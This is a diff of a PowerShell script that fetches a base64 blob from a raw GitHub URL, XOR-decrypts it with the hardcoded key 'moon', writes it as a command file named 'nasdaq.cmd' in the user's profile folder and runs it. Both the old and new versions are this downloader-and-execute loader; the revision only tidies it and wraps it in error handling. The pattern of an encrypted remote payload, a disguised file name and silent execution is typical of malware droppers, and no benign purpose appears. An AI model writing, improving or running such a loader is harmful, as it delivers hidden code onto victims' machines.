@@ -1,21 +1,26 @@
 $u='https://raw.githubusercontent.com/Jakeryan500/a/refs/heads/main/skibidi'
-$k='moon'
 
-$d = ((Invoke-WebRequest $u -UseBasicParsing).Content -replace '\s','')
-$b = [Convert]::FromBase64String($d)
+try{
+    $k='moon'
+    if(!$u -or !$k){throw 'Missing URL or key'}
 
-$kb = [Text.Encoding]::UTF8.GetBytes($k)
-if ($kb.Length -eq 0) { throw "Key is empty" }
+    $d=(iwr $u -UseBasicParsing -ErrorAction Stop).Content -replace '\s'
+    $b=[Convert]::FromBase64String($d)
 
-$out = New-Object byte[] $b.Length
+    $kb=[Text.Encoding]::UTF8.GetBytes($k)
+    if(!$kb.Length){throw 'Empty key'}
 
-for ($i = 0; $i -lt $b.Length; $i++) {
-    $out[$i] = $b[$i] -bxor $kb[$i % $kb.Length]
+    $o=[byte[]](0..($b.Length-1)|%{
+        $b[$_] -bxor $kb[$_%$kb.Length]
+    })
+
+    [IO.File]::WriteAllBytes("$env:USERPROFILE\nasdaq.cmd",$o)
+
+
+
+& "$env:USERPROFILE\nasdaq.cmd"
+
 }
-
-$path = "$env:USERPROFILE\decrypted.bat"
-
-$text = [Text.Encoding]::UTF8.GetString($out)
-
-Set-Content -Path $path -Value $text
-Start-Process -FilePath $path
+catch{
+    Write-Host "Error: $($_.Exception.Message)"
+}
